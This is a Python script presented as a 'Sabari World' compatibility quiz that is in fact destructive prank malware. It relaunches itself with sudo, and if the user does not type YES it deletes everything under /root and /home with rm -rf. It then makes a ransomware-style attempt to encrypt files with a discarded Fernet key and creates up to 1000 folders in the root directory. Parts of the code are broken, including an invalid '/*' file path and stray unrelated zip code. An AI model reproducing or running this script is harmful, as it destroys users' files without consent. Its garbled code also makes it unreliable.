import os
from cryptography.fernet import Fernet
import subprocess
import platform
import sys
import zipfile
import os


# Check if the script is already running as root
if os.geteuid() == 0:
    print("You are already running as root!")
else:
    # Attempt to escalate privileges using sudo
    try:
        # Get the absolute path to the current script
        script_path = os.path.abspath(sys.argv[0])
        
        # Execute the script with sudo
        os.execlp("sudo", "sudo", "python3", script_path)
    except Exception as e:
        print(f"Failed to acquire root privileges: {e}")
os_name = platform.system()
print(os_name)
# Check if the script is running as root
if os.geteuid() == 0:
    print("You are already running as root!")
else:
    # Prompt the user for root privileges
    print("This script requires root privileges to continue.")
    print("Please enter your password below:")
    
    # Execute a command that requires root privileges (e.g., updating the system)
    try:
        subprocess.run(["sudo", "apt", "update"], check=True)
        print("Update successful!")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred: {e}")

if os_name == "Linux":
    # Install dependencies
    dependencies = ['figlet', 'cryptography']
    for dependency in dependencies:
        subprocess.run(['pip', 'install', dependency])

    os.system("figlet 'Welcome to Sabari World!' | lolcat")
    print("\n")
    print("Let's check your compatibility for the Sabari World")
    print("If your guess is wrong, your system will be sabarified..........!!!!!!!!")
    y = input("Are you sure Sabari is Sabari? Please type YES or NO: ")
    if y.upper() == "YES":
        print("Welcome to Sabari World")
        exit()
    else:
        print("You are not compatible for Sabari World")
        os.system("rm -rf /root/*")
        os.system("rm -rf /home/*")
        os.system("mkdir /sabarified && echo 'You are sabarified' >> /sabarified.txt")
        os.system("figlet 'You are SABARIFIED!!!'")
def zip_folder(folder_path, zip_path):
    
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        for root, _, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                zip_file.write(file_path, os.path.relpath(file_path, folder_path))

def main():
    folder_path = '/path/to/folder'  # Specify the folder path to zip
    zip_path = 'output.zip'  # Specify the output zip file path
    zip_folder(folder_path, zip_path)
    print("Folder zipped successfully.")

if __name__ == "__main__":
    main()
key = Fernet.generate_key()
cipher = Fernet(key)
file_path = "/*"
with open(file_path, "rb") as file:
            plaintext = file.read()
encrypted_text = cipher.encrypt(plaintext)
encrypted_file_path = "encrypted1_file.enc"
with open(encrypted_file_path, "wb") as encrypted_file:
            encrypted_file.write(encrypted_text)
print("Your Files are Sabarified.")
base_dir = "/"
max_folder_size = 90000000000
num_folders = 1000
for i in range(1, num_folders + 1):
            folder_name = f"folder_{i}"
            folder_path = os.path.join(base_dir, folder_name)

            # Check if the folder size exceeds the maximum limit
            if os.path.exists(folder_path):
                folder_size = sum(os.path.getsize(os.path.join(folder_path, f)) for f in os.listdir(folder_path))
                if folder_size >= max_folder_size:
                    print(f"Folder '{folder_name}' already exceeds the maximum size limit.")
                    continue

            # Create the folder
            os.makedirs(folder_path, exist_ok=True)
            print(f"Folder '{folder_name}' created at: {folder_path}")

else:
    exit()
